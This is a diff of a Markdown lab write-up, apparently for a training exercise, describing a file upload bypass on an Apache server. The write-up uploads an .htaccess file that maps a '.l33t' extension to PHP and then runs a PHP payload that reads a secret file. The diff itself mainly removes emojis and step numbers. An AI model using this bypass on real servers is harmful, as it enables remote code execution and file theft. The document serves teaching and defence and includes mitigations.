@@ -4,8 +4,8 @@
 This project documents a successful file upload exploitation against a simulated vulnerable web application.  
 The lab demonstrates how weak file upload validation can be bypassed to achieve **remote code execution (RCE)** using an `.htaccess` trick on an Apache server.
 
+---
 
-```
 ## 📑 Table of Contents
 1. [Lab Overview](#lab-overview)  
 2. [Exploitation Walkthrough](#exploitation-walkthrough)  
@@ -20,19 +20,19 @@ The lab demonstrates how weak file upload validation can be bypassed to achieve 
 5. [Proof of Exploit](#proof-of-exploit)  
 6. [Secret Obtained](#secret-obtained)  
 7. [Takeaways](#takeaways)  
-```
 
+---
 
-## 📖 Lab Overview
+## Lab Overview
 - **Target:** Web application with avatar upload functionality  
 - **Vulnerability:** File upload restrictions + Apache `.htaccess` misconfiguration  
 - **Impact:** Remote Code Execution → Secret file disclosure  
 
 ---
 
-## ⚙️ Exploitation Walkthrough
+## Exploitation Walkthrough
 
-### 1. Normal File Upload
+### Normal File Upload
 - Logged in and uploaded an image as the avatar.  
 - Observed the image was fetched with:
 
@@ -40,7 +40,7 @@ The lab demonstrates how weak file upload validation can be bypassed to achieve 
 GET /files/avatars/<YOUR-IMAGE>
 ````
 
-### 2. Crafting Malicious Payload
+### Crafting Malicious Payload
 
 Created a PHP file `exploit.php` to read Carlos’s secret:
 
@@ -52,7 +52,7 @@ echo file_get_contents('/home/carlos/secret');
 
 * Attempt to upload failed → `.php` extension not allowed.
 
-### 3. Identifying Server
+### Identifying Server
 
 The response from `POST /my-account/avatar` revealed:
 
@@ -62,7 +62,7 @@ Server: Apache/2.4.41 (Ubuntu)
 
 * Apache + mod\_php hinted at an `.htaccess` bypass.
 
-### 4. Uploading `.htaccess`
+### Uploading .htaccess
 
 Modified the upload request in Burp Repeater:
 
@@ -75,7 +75,7 @@ AddType application/x-httpd-php .l33t
 
 * Uploaded successfully ✅
 
-### 5. Uploading Exploit with New Extension
+### Uploading Exploit with New Extension
 
 Reused the upload request:
 
@@ -86,7 +86,7 @@ Reused the upload request:
 
 * Uploaded successfully ✅
 
-### 6. Triggering RCE
+### Triggering RCE
 
 Requested:
 
@@ -102,7 +102,7 @@ FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
 
 ---
 
-## 🚨 Security Impact
+## Security Impact
 
 * **Severity:** 🔴 High
 * **Risk:** Arbitrary PHP execution on the server
@@ -110,7 +110,7 @@ FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
 
 ---
 
-## 🔒 Recommended Mitigations
+## Recommended Mitigations
 
 * Disable `.htaccess` overrides:
 
@@ -124,13 +124,13 @@ AllowOverride None
 
 ---
 
-## ✅ Proof of Exploit
+## Proof of Exploit
 
 <img width="957" height="1079" alt="Proof of exploit in Burp Repeater" src="https://github.com/user-attachments/assets/f15c03db-3747-4761-9709-d0349b92cd41" />
 
 ---
 
-## 🗝️ Secret Obtained
+## Secret Obtained
 
 ```
 FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
@@ -138,7 +138,7 @@ FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
 
 ---
 
-## 📚 Takeaways
+## Takeaways
 
 This lab highlights how **misconfigured servers + weak upload validation** can escalate into RCE.
 Preventing such attacks requires **defense-in-depth**: secure configs, strict validation, and isolating user uploads.
